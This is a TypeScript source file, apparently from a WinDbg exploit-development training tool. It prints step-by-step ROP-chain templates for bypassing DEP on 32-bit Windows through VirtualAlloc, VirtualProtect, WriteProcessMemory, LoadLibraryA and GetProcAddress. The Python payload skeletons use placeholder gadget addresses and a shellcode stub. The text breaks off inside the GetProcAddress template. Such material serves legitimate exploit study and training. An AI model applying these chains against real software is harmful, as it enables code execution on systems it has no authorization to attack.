import { Command, CommandResult } from "../core/registry";
import * as out from "../core/output";

type Field = { name: string; value: string; how: string };

function fieldTable(fields: Field[]): void {
  out.print(`  ${"Field".padEnd(24)}${"Real value".padEnd(30)}How to get it`);
  for (const field of fields) out.print(`  ${field.name.padEnd(24)}${field.value.padEnd(30)}${field.how}`);
}

function skeletonGadgets(mod: string): void {
  out.section("Step 2 — gadgets the chain needs");
  out.print(`  Load the corpus first:  dx @$osed().rop.scan_live("${mod}", "<bad chars>")`);
  out.print('  Capture ESP:            dx @$osed().rop.query("capability", "STACK_POINTER_CAPTURE")   push esp ; pop eax ; ret');
  out.print('  Copy a register:        dx @$osed().rop.query("capability", "MOVE_REGISTER")           mov esi, eax / push eax ; pop esi');
  out.print('  Add or subtract:        dx @$osed().rop.query("capability", "REGISTER_ADD")            add eax, ecx ; ret  (also REGISTER_SUB)');
  out.print('  Negate:                 dx @$osed().rop.query("capability", "REGISTER_NEGATE")         neg eax ; ret');
  out.print('  Read a pointer:         dx @$osed().rop.query("capability", "MEMORY_READ")             mov eax, [eax] ; ret');
  out.print('  Write a field:          dx @$osed().rop.query("capability", "MEMORY_WRITE")            mov [esi], eax ; ret');
  out.print('  Next field (+4):        dx @$osed().rop.query("capability", "REGISTER_INCREMENT")      inc esi ; ret, four times');
  out.print('  Values with 00 bytes:   dx @$osed().rop.construct("eax", 0x40, "<bad chars>")          a recipe and pack() lines');
  out.print(`  Pivot ESP to the frame: ${`dx @$osed().pivots("${mod}", 15)`.padEnd(63)}xchg eax, esp ; ret  or  leave ; ret`);
}

function skeletonChainStart(apiName: string, slotName: string): void {
  out.print('rop = b""');
  out.print("# 1. capture ESP and keep it in a register that the next gadgets do not clobber");
  out.print("rop += p32(0x????????)    # push esp ; pop eax ; ret");
  out.print("rop += p32(0x????????)    # push eax ; pop esi ; ret   (ESI = working pointer)");
  out.print("# 2. move ESI back to the first field: ESI + negative distance (measure it with dd at a bp)");
  out.print("rop += p32(0x????????)    # pop ecx ; ret");
  out.print("rop += p32(0x????????)    # negative distance, e.g. 0xFFFFFFxx, no 00 bytes");
  out.print("rop += p32(0x????????)    # add esi, ecx ; ret  (or add eax, ecx, then move it back to esi)");
  out.print(`# 3. field 1: ${apiName} = [${slotName}]`);
  out.print("rop += p32(0x????????)    # pop eax ; ret");
  out.print(`${`rop += p32(${slotName})`.padEnd(26)}# a slot with bad bytes: rop.construct or two clean constants`);
  out.print("rop += p32(0x????????)    # mov eax, [eax] ; ret");
  out.print("rop += p32(0x????????)    # mov [esi], eax ; ret");
  out.print("rop += p32(0x????????) * 4  # inc esi ; ret  -> field 2");
}

function skeletonTail(frameName: string, target: string): void {
  out.print("");
  out.print('shellcode = b"\\x90" * 16 + b"..."   # msfvenom ... -b "<bad chars>"');
  out.print(`payload  = b"A" * (OFFSET - len(${frameName})) + ${frameName} + rop`);
  out.print(`payload += b"C" * ???     # padding so the shellcode lands where ${target}`);
  out.print("payload += shellcode");
}

function vaSkeletonTemplate(mod: string): void {
  out.section("VirtualAlloc DEP Bypass — Skeleton Method (patch each field)");
  out.print("Prototype: LPVOID VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)");
  out.print("Goal:      on a page that is already committed, MEM_COMMIT with flProtect = 0x40");
  out.print("           only changes its protection, so the stack becomes PAGE_EXECUTE_READWRITE.");
  out.print("Idea:      put a 6-dword frame with dummy values in the buffer, let the ROP chain");
  out.print("           overwrite each dummy with the real value, then pivot ESP onto the frame.");

  out.section("Step 1 — values and where each one comes from");
  fieldTable([
    { name: "VirtualAlloc", value: "address read from the IAT", how: 'dx @$osed().sc.iat_find("VirtualAlloc")  (the slot, then mov eax, [eax])' },
    { name: "Return address", value: "shellcode address", how: "ESP captured at run time + measured offset" },
    { name: "lpAddress", value: "shellcode address", how: "same value as the return address" },
    { name: "dwSize", value: "0x1", how: "any size inside one page: pop 0xFFFFFFFF ; neg" },
    { name: "flAllocationType", value: "0x1000 (MEM_COMMIT)", how: 'dx @$osed().rop.construct("eax", 0x1000, "<bad chars>")' },
    { name: "flProtect", value: "0x40 (PAGE_EXECUTE_RW)", how: "pop 0xFFFFFFC0 ; neg" },
  ]);

  skeletonGadgets(mod);

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
  out.print("");
  out.print("OFFSET = ???              # bytes from buffer start to EIP");
  out.print('VA_IAT = 0x????????       # IAT slot of VirtualAlloc  dx @$osed().sc.iat_find("VirtualAlloc")');
  out.print("");
  out.print('# dummy frame, placed just before EIP (dx @$osed().dep_function("VirtualAlloc") prints the same order)');
  out.print("va  = p32(0x45454545)     # VirtualAlloc address  <- patched by the chain");
  out.print("va += p32(0x46464646)     # return address        <- shellcode address");
  out.print("va += p32(0x47474747)     # lpAddress             <- shellcode address");
  out.print("va += p32(0x48484848)     # dwSize                <- 0x1");
  out.print("va += p32(0x49494949)     # flAllocationType      <- 0x1000");
  out.print("va += p32(0x51515151)     # flProtect             <- 0x40");
  out.print("");
  skeletonChainStart("VirtualAlloc", "VA_IAT");
  out.print("# 4. fields 2 and 3: shellcode address = ESI + distance to the shellcode");
  out.print("# 5. field 4: dwSize = 0x1      (pop eax 0xFFFFFFFF ; neg eax)");
  out.print('# 6. field 5: 0x1000           (rop.construct("eax", 0x1000, ...))');
  out.print("# 7. field 6: 0x40             (pop eax 0xFFFFFFC0 ; neg eax)");
  out.print("# 8. pivot: ESI - 0x14 = field 1, move it into ESP");
  out.print("rop += p32(0x????????)    # xchg eax, esp ; ret  (EAX = field 1)  or leave ; ret (EBP = field 1 - 4)");
  skeletonTail("va", "fields 2 and 3 point");

  out.section("Step 4 — check each field before the next one");
  out.print("  bp <first gadget> ; g ; dd esp-1c L6                          the dummy frame, 45454545 to 51515151");
  out.print("  bp <gadget after a write> ; g ; dd esi L1                     the patched field holds the real value");
  out.print("  bp KERNELBASE!VirtualAlloc ; g ; dds esp L5                   return, lpAddress, 0x1, 0x1000, 0x40");
  out.print("  pt ; !vprot <shellcode address>                               Protect: 00000040 PAGE_EXECUTE_READWRITE");
}

function vaPushadTemplate(mod: string): void {
  out.section("VirtualAlloc DEP Bypass — PUSHAD Method");
  out.print("Prototype: LPVOID VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)");
  out.print("Goal:      load each register, then PUSHAD writes the whole call frame in one instruction.");
  out.print("Catch:     every register needs a clean gadget, and a later gadget must not clobber an");
  out.print("           earlier register. When one is missing, use the skeleton method instead.");

  out.section("Step 1 — find addresses");
  out.print('  VirtualAlloc slot:     dx @$osed().sc.iat_find("VirtualAlloc")');
  out.print(`  Gadgets:               dx @$osed().rop.scan_live("${mod}", "<bad chars>")  then  rop.query(...)`);
  out.print(`  pushad ; ret:          dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print(`  jmp esp / call esp:    dx @$osed().find_bytes("${mod}", "FF E4")  or  "FF D4"`);
  out.print('  Clean constants:       dx @$osed().rop.construct("ecx", 0x40, "<bad chars>")');
  out.print('  Load order:            dx @$osed().rop.setup("ebx=0x1 edx=0x1000 ecx=0x40", "<bad chars>")');

  out.section("Step 2 — PUSHAD register map");
  out.print("  PUSHAD pushes EAX, ECX, EDX, EBX, the original ESP, EBP, ESI, EDI. After it, from ESP up:");
  out.print("    [ESP+0]  = EDI        <- ret ; (a ROP NOP, the RET of pushad lands here)");
  out.print("    [ESP+4]  = ESI        <- VirtualAlloc address (read from the IAT slot)");
  out.print("    [ESP+8]  = EBP        <- return address of VirtualAlloc: jmp esp / call esp");
  out.print("    [ESP+12] = saved ESP  <- lpAddress: points into the stack for free");
  out.print("    [ESP+16] = EBX        <- dwSize = 0x1");
  out.print("    [ESP+20] = EDX        <- flAllocationType = 0x1000");
  out.print("    [ESP+24] = ECX        <- flProtect = 0x40");
  out.print("    [ESP+28] = EAX        <- 0x90909090, the start of the NOP sled");

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
  out.print("");
  out.print("OFFSET = ???");
  out.print('VA_IAT = 0x????????       # dx @$osed().sc.iat_find("VirtualAlloc")');
  out.print("");
  out.print('rop = b""');
  out.print("# ESI = VirtualAlloc (read the slot first, then move it to ESI)");
  out.print("rop += p32(0x????????)    # pop eax ; ret");
  out.print("rop += p32(VA_IAT)");
  out.print("rop += p32(0x????????)    # mov eax, [eax] ; ret");
  out.print("rop += p32(0x????????)    # xchg eax, esi ; ret");
  out.print("# EBP = jmp esp");
  out.print("rop += p32(0x????????)    # pop ebp ; ret");
  out.print(`rop += p32(0x????????)    # jmp esp  dx @$osed().find_bytes("${mod}", "FF E4")`);
  out.print("# EBX = 0x1, EDX = 0x1000, ECX = 0x40 (each built without 00 bytes)");
  out.print('rop += p32(0x????????)    # ... rop.construct("ebx", 0x1, ...)');
  out.print('rop += p32(0x????????)    # ... rop.construct("edx", 0x1000, ...)');
  out.print('rop += p32(0x????????)    # ... rop.construct("ecx", 0x40, ...)');
  out.print("# EDI = ROP NOP, EAX = NOPs");
  out.print("rop += p32(0x????????)    # pop edi ; ret");
  out.print("rop += p32(0x????????)    # address of any ret");
  out.print("rop += p32(0x????????)    # pop eax ; ret");
  out.print("rop += p32(0x90909090)");
  out.print("rop += p32(0x????????)    # pushad ; ret");
  out.print("");
  out.print('shellcode = b"\\x90" * 16 + b"..."');
  out.print('payload = b"A" * OFFSET + rop + shellcode');

  out.section("Step 4 — check");
  out.print("  bp <pushad ; ret> ; g ; p ; dds esp L8                        the map above, in this order");
  out.print("  bp KERNELBASE!VirtualAlloc ; g ; dds esp L5                   jmp esp, stack address, 0x1, 0x1000, 0x40");
}

function vpSkeletonTemplate(mod: string): void {
  out.section("VirtualProtect DEP Bypass — Skeleton Method (patch each field)");
  out.print("Prototype: BOOL VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)");
  out.print("Goal:      give the stack page that holds the shellcode PAGE_EXECUTE_READWRITE (0x40).");
  out.print("Idea:      put a 6-dword frame with dummy values in the buffer, let the ROP chain");
  out.print("           overwrite each dummy with the real value, then pivot ESP onto the frame.");

  out.section("Step 1 — values and where each one comes from");
  fieldTable([
    { name: "VirtualProtect", value: "address read from the IAT", how: 'dx @$osed().sc.iat_find("VirtualProtect")  (the slot, then mov eax, [eax])' },
    { name: "Return address", value: "shellcode address", how: "ESP captured at run time + measured offset" },
    { name: "lpAddress", value: "shellcode address", how: "same value as the return address" },
    { name: "dwSize", value: "0x201", how: "covers the shellcode, even across a page edge: pop 0xFFFFFDFF ; neg" },
    { name: "flNewProtect", value: "0x40 (PAGE_EXECUTE_RW)", how: "pop 0xFFFFFFC0 ; neg" },
    { name: "lpflOldProtect", value: "a writable address", how: `dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")` },
  ]);
  out.print("  lpflOldProtect must be writable or VirtualProtect fails. A STAGING cave lies in a writable");
  out.print("  section such as .data. A module without ASLR keeps it fixed, so it can stay a literal in the frame.");

  skeletonGadgets(mod);

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
  out.print("");
  out.print("OFFSET   = ???            # bytes from buffer start to EIP");
  out.print('VP_IAT   = 0x????????     # IAT slot of VirtualProtect  dx @$osed().sc.iat_find("VirtualProtect")');
  out.print(`WRITABLE = 0x????????     # writable dword  dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")`);
  out.print("");
  out.print('# dummy frame, placed just before EIP (dx @$osed().dep_function("VirtualProtect") prints the same order)');
  out.print("vp  = p32(0x45454545)     # VirtualProtect address  <- patched by the chain");
  out.print("vp += p32(0x46464646)     # return address          <- shellcode address");
  out.print("vp += p32(0x47474747)     # lpAddress               <- shellcode address");
  out.print("vp += p32(0x48484848)     # dwSize                  <- 0x201");
  out.print("vp += p32(0x49494949)     # flNewProtect            <- 0x40");
  out.print("vp += p32(WRITABLE)       # lpflOldProtect          literal when clean, else patch it too");
  out.print("");
  skeletonChainStart("VirtualProtect", "VP_IAT");
  out.print("# 4. fields 2 and 3: shellcode address = ESI + distance to the shellcode");
  out.print("# 5. field 4: dwSize = 0x201    (pop eax 0xFFFFFDFF ; neg eax)");
  out.print("# 6. field 5: 0x40             (pop eax 0xFFFFFFC0 ; neg eax)");
  out.print("# 7. field 6: only if WRITABLE has bad bytes (rop.construct, then mov [esi], eax)");
  out.print("# 8. pivot: ESI - 0x10 = field 1 after field 5 (ESI - 0x14 after field 6), move it into ESP");
  out.print("rop += p32(0x????????)    # xchg eax, esp ; ret  (EAX = field 1)  or leave ; ret (EBP = field 1 - 4)");
  skeletonTail("vp", "fields 2 and 3 point");

  out.section("Step 4 — check each field before the next one");
  out.print("  bp <first gadget> ; g ; dd esp-1c L6                          the dummy frame and WRITABLE");
  out.print("  bp <gadget after a write> ; g ; dd esi L1                     the patched field holds the real value");
  out.print("  bp KERNELBASE!VirtualProtect ; g ; dds esp L5                 return, lpAddress, 0x201, 0x40, WRITABLE");
  out.print("  pt ; !vprot <shellcode address>                               Protect: 00000040 PAGE_EXECUTE_READWRITE");
  out.print("  dd <WRITABLE> L1                                              the old protection, usually 00000004");
}

function vpPushadTemplate(mod: string): void {
  out.section("VirtualProtect DEP Bypass — PUSHAD Method");
  out.print("Prototype: BOOL VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)");
  out.print("Goal:      load each register, then PUSHAD writes the whole call frame in one instruction.");
  out.print("Catch:     every register needs a clean gadget, and a later gadget must not clobber an");
  out.print("           earlier register. When one is missing, use the skeleton method instead.");

  out.section("Step 1 — find addresses");
  out.print('  VirtualProtect slot:   dx @$osed().sc.iat_find("VirtualProtect")');
  out.print(`  Gadgets:               dx @$osed().rop.scan_live("${mod}", "<bad chars>")  then  rop.query(...)`);
  out.print(`  pushad ; ret:          dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print(`  jmp esp / call esp:    dx @$osed().find_bytes("${mod}", "FF E4")  or  "FF D4"`);
  out.print(`  Writable address:      dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")`);
  out.print('  Load order:            dx @$osed().rop.setup("ebx=0x201 edx=0x40", "<bad chars>")');

  out.section("Step 2 — PUSHAD register map");
  out.print("  PUSHAD pushes EAX, ECX, EDX, EBX, the original ESP, EBP, ESI, EDI. After it, from ESP up:");
  out.print("    [ESP+0]  = EDI        <- ret ; (a ROP NOP, the RET of pushad lands here)");
  out.print("    [ESP+4]  = ESI        <- VirtualProtect address (read from the IAT slot)");
  out.print("    [ESP+8]  = EBP        <- return address of VirtualProtect: jmp esp / call esp");
  out.print("    [ESP+12] = saved ESP  <- lpAddress: points into the stack for free");
  out.print("    [ESP+16] = EBX        <- dwSize = 0x201");
  out.print("    [ESP+20] = EDX        <- flNewProtect = 0x40");
  out.print("    [ESP+24] = ECX        <- lpflOldProtect = a writable address");
  out.print("    [ESP+28] = EAX        <- 0x90909090, jmp esp runs it, then the shellcode");

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
  out.print("");
  out.print("OFFSET   = ???");
  out.print('VP_IAT   = 0x????????     # dx @$osed().sc.iat_find("VirtualProtect")');
  out.print("WRITABLE = 0x????????     # writable dword, see step 1");
  out.print("");
  out.print('rop = b""');
  out.print("# ESI = VirtualProtect (read the slot first, then move it to ESI)");
  out.print("rop += p32(0x????????)    # pop eax ; ret");
  out.print("rop += p32(VP_IAT)");
  out.print("rop += p32(0x????????)    # mov eax, [eax] ; ret");
  out.print("rop += p32(0x????????)    # xchg eax, esi ; ret");
  out.print("# EBP = jmp esp");
  out.print("rop += p32(0x????????)    # pop ebp ; ret");
  out.print(`rop += p32(0x????????)    # jmp esp  dx @$osed().find_bytes("${mod}", "FF E4")`);
  out.print("# EBX = 0x201, EDX = 0x40 (each built without 00 bytes), ECX = WRITABLE");
  out.print("rop += p32(0x????????)    # pop ebx ; ret");
  out.print("rop += p32(0xFFFFFDFF)    # -0x201");
  out.print("rop += p32(0x????????)    # neg ebx ; ret");
  out.print("rop += p32(0x????????)    # pop edx ; ret");
  out.print("rop += p32(0xFFFFFFC0)    # -0x40");
  out.print("rop += p32(0x????????)    # neg edx ; ret");
  out.print("rop += p32(0x????????)    # pop ecx ; ret");
  out.print("rop += p32(WRITABLE)");
  out.print("# EDI = ROP NOP, EAX = NOPs");
  out.print("rop += p32(0x????????)    # pop edi ; ret");
  out.print("rop += p32(0x????????)    # address of any ret");
  out.print("rop += p32(0x????????)    # pop eax ; ret");
  out.print("rop += p32(0x90909090)");
  out.print(`rop += p32(0x????????)    # pushad ; ret  dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print("");
  out.print('shellcode = b"\\x90" * 16 + b"..."   # dx @$osed().nop(16)');
  out.print('payload = b"A" * OFFSET + rop + shellcode');

  out.section("Step 4 — check");
  out.print("  bp <pushad ; ret> ; g ; p ; dds esp L8                        the map above, in this order");
  out.print("  bp KERNELBASE!VirtualProtect ; g ; dds esp L5                 jmp esp, stack address, 0x201, 0x40, WRITABLE");
  out.print("  pt ; !vprot <stack address>                                   Protect: 00000040 PAGE_EXECUTE_READWRITE");
}

function wpmSkeletonTemplate(mod: string): void {
  out.section("WriteProcessMemory DEP Bypass — Skeleton Method (patch each field)");
  out.print("Prototype: BOOL WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)");
  out.print("Goal:      copy the shellcode into a code cave in an executable .text section, then return into it.");
  out.print("           WriteProcessMemory makes a read-only page writable for the copy and restores it after.");
  out.print("Idea:      put a 7-dword frame in the buffer, let the ROP chain patch the fields only known at");
  out.print("           run time, then pivot ESP onto the frame. Fixed, clean values stay literal.");

  out.section("Step 1 — values and where each one comes from");
  fieldTable([
    { name: "WriteProcessMemory", value: "address read from the IAT", how: 'dx @$osed().sc.iat_find("WriteProcessMemory")  (the slot, then mov eax, [eax])' },
    { name: "Return address", value: "code cave address", how: `dx @$osed().code_caves("${mod}", 0x200, 25, "<bad chars>", "EXEC")` },
    { name: "hProcess", value: "0xFFFFFFFF", how: "the pseudo handle of the current process, a literal" },
    { name: "lpBaseAddress", value: "code cave address", how: "same value as the return address" },
    { name: "lpBuffer", value: "shellcode address (stack)", how: "ESP captured at run time + measured offset" },
    { name: "nSize", value: "shellcode length", how: "e.g. 0x210: pop 0xFFFFFDF0 ; neg" },
    { name: "lpNumberOfBytesWritten", value: "a writable address", how: `dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")` },
  ]);
  out.print("  The cave must sit in a module without ASLR, and its address must be free of bad bytes.");
  out.print("  The cave is not writable once the copy ends, so a decoder that rewrites the shellcode in place");
  out.print("  crashes there. Keep the payload free of bad bytes without a self-modifying decoder.");

  skeletonGadgets(mod);

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
  out.print("");
  out.print("OFFSET   = ???            # bytes from buffer start to EIP");
  out.print('WPM_IAT  = 0x????????     # IAT slot of WriteProcessMemory  dx @$osed().sc.iat_find("WriteProcessMemory")');
  out.print("CAVE     = 0x????????     # executable code cave, see step 1");
  out.print("WRITABLE = 0x????????     # writable dword, see step 1");
  out.print("");
  out.print('# frame, placed just before EIP (dx @$osed().dep_function("WriteProcessMemory") prints the same order)');
  out.print("wpm  = p32(0x45454545)    # WriteProcessMemory address  <- patched by the chain");
  out.print("wpm += p32(CAVE)          # return address              literal");
  out.print("wpm += p32(0xFFFFFFFF)    # hProcess                    literal");
  out.print("wpm += p32(CAVE)          # lpBaseAddress               literal");
  out.print("wpm += p32(0x46464646)    # lpBuffer                    <- shellcode address");
  out.print("wpm += p32(0x47474747)    # nSize                       <- 0x210");
  out.print("wpm += p32(WRITABLE)      # lpNumberOfBytesWritten      literal");
  out.print("");
  skeletonChainStart("WriteProcessMemory", "WPM_IAT");
  out.print("rop += p32(0x????????) * 12 # inc esi ; ret  -> field 5 (or add esi with a clean negative)");
  out.print("# 4. field 5: lpBuffer = ESI + distance to the shellcode, then mov [esi], eax");
  out.print("# 5. field 6: nSize = 0x210     (pop eax 0xFFFFFDF0 ; neg eax), then mov [esi+4] or inc esi x4");
  out.print("# 6. pivot: frame start = field 6 - 0x14, move it into ESP");
  out.print("rop += p32(0x????????)    # xchg eax, esp ; ret  (EAX = field 1)  or leave ; ret (EBP = field 1 - 4)");
  skeletonTail("wpm", "field 5 points");

  out.section("Step 4 — check each field before the next one");
  out.print("  bp <first gadget> ; g ; dd esp-20 L7                          the frame, dummies and literals");
  out.print("  bp <gadget after a write> ; g ; dd esi L1                     the patched field holds the real value");
  out.print("  bp KERNELBASE!WriteProcessMemory ; g ; dds esp L6             CAVE, FFFFFFFF, CAVE, stack address, 0x210, WRITABLE");
  out.print("  pt ; u <CAVE>                                                 the shellcode, copied into the cave");
  out.print("  !vprot <CAVE>                                                 Protect: 00000020 PAGE_EXECUTE_READ, as before");
}

function wpmPushadTemplate(mod: string): void {
  out.section("WriteProcessMemory DEP Bypass — PUSHAD Method");
  out.print("Prototype: BOOL WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)");
  out.print("Goal:      copy the shellcode into an executable code cave, then return into it.");
  out.print("Catch:     after pushad ; ret the saved ESP sits in the slot where the second argument goes,");
  out.print("           and for WriteProcessMemory that is lpBaseAddress, which must be the cave. So EDI holds");
  out.print("           a gadget that pops three dwords and execution resumes at EBX. The last three");
  out.print("           arguments then come from the dwords right after the pushad gadget in the payload.");
  out.print("           lpBuffer is a stack address, so it still needs one write. The skeleton method is simpler.");

  out.section("Step 1 — find addresses");
  out.print('  WriteProcessMemory:    dx @$osed().sc.iat_find("WriteProcessMemory")');
  out.print(`  Gadgets:               dx @$osed().rop.scan_live("${mod}", "<bad chars>")  then  rop.query(...)`);
  out.print(`  pushad ; ret:          dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print(`  Skip three dwords:     dx @$osed().add_esp("${mod}")  add esp, 0xC ; ret, or pop ; pop ; pop ; ret`);
  out.print(`  Code cave:             dx @$osed().code_caves("${mod}", 0x200, 25, "<bad chars>", "EXEC")`);
  out.print(`  Writable address:      dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")`);

  out.section("Step 2 — PUSHAD register map");
  out.print("  PUSHAD pushes EAX, ECX, EDX, EBX, the original ESP, EBP, ESI, EDI. After it, from ESP up:");
  out.print("    [ESP+0]  = EDI        <- add esp, 0xC ; ret (skips the next three dwords)");
  out.print("    [ESP+4]  = ESI        <- skipped");
  out.print("    [ESP+8]  = EBP        <- skipped");
  out.print("    [ESP+12] = saved ESP  <- skipped");
  out.print("    [ESP+16] = EBX        <- WriteProcessMemory address (read from the IAT slot)");
  out.print("    [ESP+20] = EDX        <- return address = CAVE");
  out.print("    [ESP+24] = ECX        <- hProcess = 0xFFFFFFFF");
  out.print("    [ESP+28] = EAX        <- lpBaseAddress = CAVE");
  out.print("    [ESP+32]  payload     <- lpBuffer = shellcode address, patched by one write");
  out.print("    [ESP+36]  payload     <- nSize, patched if it holds bad bytes");
  out.print("    [ESP+40]  payload     <- lpNumberOfBytesWritten = WRITABLE");

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
  out.print("");
  out.print("OFFSET   = ???");
  out.print('WPM_IAT  = 0x????????     # dx @$osed().sc.iat_find("WriteProcessMemory")');
  out.print("CAVE     = 0x????????     # executable code cave");
  out.print("WRITABLE = 0x????????     # writable dword");
  out.print("");
  out.print('rop = b""');
  out.print("# first patch the lpBuffer dword after the pushad gadget (push esp ; pop eax, add, mov [reg], eax)");
  out.print("# EBX = WriteProcessMemory");
  out.print("rop += p32(0x????????)    # pop eax ; ret");
  out.print("rop += p32(WPM_IAT)");
  out.print("rop += p32(0x????????)    # mov eax, [eax] ; ret");
  out.print("rop += p32(0x????????)    # xchg eax, ebx ; ret");
  out.print("rop += p32(0x????????)    # pop edx ; ret");
  out.print("rop += p32(CAVE)");
  out.print("rop += p32(0x????????)    # pop ecx ; ret");
  out.print("rop += p32(0xFFFFFFFF)");
  out.print("rop += p32(0x????????)    # pop edi ; ret");
  out.print(`rop += p32(0x????????)    # add esp, 0xC ; ret  dx @$osed().add_esp("${mod}")`);
  out.print("rop += p32(0x????????)    # pop eax ; ret");
  out.print("rop += p32(CAVE)");
  out.print(`rop += p32(0x????????)    # pushad ; ret  dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print("rop += p32(0x46464646)    # lpBuffer                <- shellcode address");
  out.print("rop += p32(0x47474747)    # nSize                   <- 0x210");
  out.print("rop += p32(WRITABLE)      # lpNumberOfBytesWritten");
  out.print("");
  out.print('shellcode = b"\\x90" * 16 + b"..."');
  out.print('payload = b"A" * OFFSET + rop + shellcode');

  out.section("Step 4 — check");
  out.print("  bp <pushad ; ret> ; g ; p ; dds esp L0b                       the map above, in this order");
  out.print("  bp KERNELBASE!WriteProcessMemory ; g ; dds esp L6             CAVE, FFFFFFFF, CAVE, stack address, 0x210, WRITABLE");
  out.print("  pt ; u <CAVE>                                                 the shellcode, copied into the cave");
}

function llaTemplate(mod: string): void {
  out.section("LoadLibraryA — ROP Chain Skeleton");
  out.print("Prototype: HMODULE LoadLibraryA(LPCSTR lpLibFileName)");
  out.print("Goal:      load a DLL at runtime to resolve APIs not in the target's IAT.");
  out.print("Returns:   HMODULE in EAX (pass to GetProcAddress).");

  out.section("Step 1 — find addresses");
  out.print(`  LoadLibraryA addr:     dx @$osed().sc.iat_find("LoadLibraryA")`);
  out.print(`  Gadgets (pop/etc):     dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);

  out.section("Step 2 — PUSHAD technique register map");
  out.print("  After PUSHAD ; RET, the stack looks like:");
  out.print("    [ESP+0]  = EDI  <- consumed by RET (set to LoadLibraryA address)");
  out.print("    [ESP+4]  = ESI  <- return addr (next chain stage, e.g. GetProcAddress)");
  out.print("    [ESP+8]  = EBP  <- lpLibFileName (pointer to DLL name string)");
  out.print("    [ESP+12] = saved_ESP <- (unused by LoadLibraryA)");
  out.print("    [ESP+16] = EBX  <- (unused)");
  out.print("    [ESP+20] = EDX  <- (unused)");
  out.print("    [ESP+24] = ECX  <- (unused)");
  out.print("    [ESP+28] = EAX  <- (unused)");

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v)");
  out.print("");
  out.print("OFFSET       = ???           # bytes from buffer start to EIP control");
  out.print("LLA          = 0x????????    # LoadLibraryA  dx @$osed().sc.iat_find(\"LoadLibraryA\")");
  out.print("NEXT_STAGE   = 0x????????    # return addr (e.g. GetProcAddress chain entry)");
  out.print("DLL_NAME_PTR = 0x????????    # pointer to null-terminated DLL name (e.g. \"ws2_32.dll\")");
  out.print("");
  out.print("rop_chain = b\"\"");
  out.print("");
  out.print("# ── Register setup (PUSHAD technique) ──");
  out.print("rop_chain += p32(0x????????)  # pop edi ; ret");
  out.print("rop_chain += p32(LLA)         # EDI = LoadLibraryA address");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop esi ; ret");
  out.print("rop_chain += p32(NEXT_STAGE)  # ESI = return addr (next stage)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebp ; ret");
  out.print("rop_chain += p32(DLL_NAME_PTR)# EBP = lpLibFileName");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebx ; ret  (EBX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop edx ; ret  (EDX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pushad ; ret");
  out.print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print("");
  out.print("# LoadLibraryA returns HMODULE in EAX — chain NEXT_STAGE to");
  out.print("# a GetProcAddress chain that consumes EAX as hModule.");

  out.section("Step 4 — staging the DLL name string");
  out.print("  The DLL name (e.g. \"ws2_32.dll\\x00\") must be null-terminated and");
  out.print("  accessible at DLL_NAME_PTR when LoadLibraryA runs. Options:");
  out.print("  1. Place it on the stack after the chain and compute its ESP-relative address.");
  out.print("  2. Write it into a writable .data section via WriteProcessMemory or mov [reg],val gadgets.");
  out.print("  3. Find it already in memory (e.g. a string table in the target binary).");
}

function gpaTemplate(mod: string): void {
  out.section("GetProcAddress — ROP Chain Skeleton");
  out.print("Prototype: FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName)");
  out.print("Goal:      resolve a function address from a loaded DLL at runtime.");
  out.print("Returns:   FARPROC (function pointer) in EAX.");

  out.section("Step 1 — find addresses");
  out.print(`  GetProcAddress addr:   dx @$osed().sc.iat_find("GetProcAddress")`);
  out.print(`  Gadgets (pop/etc):     dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);

  out.section("Step 2 — PUSHAD technique register map");
  out.print("  After PUSHAD ; RET, the stack looks like:");
  out.print("    [ESP+0]  = EDI  <- consumed by RET (set to GetProcAddress address)");
  out.print("    [ESP+4]  = ESI  <- return addr (next chain stage, e.g. call eax)");
  out.print("    [ESP+8]  = EBP  <- hModule (from LoadLibraryA return value in EAX)");
  out.print("    [ESP+12] = saved_ESP <- lpProcName (not directly settable)");
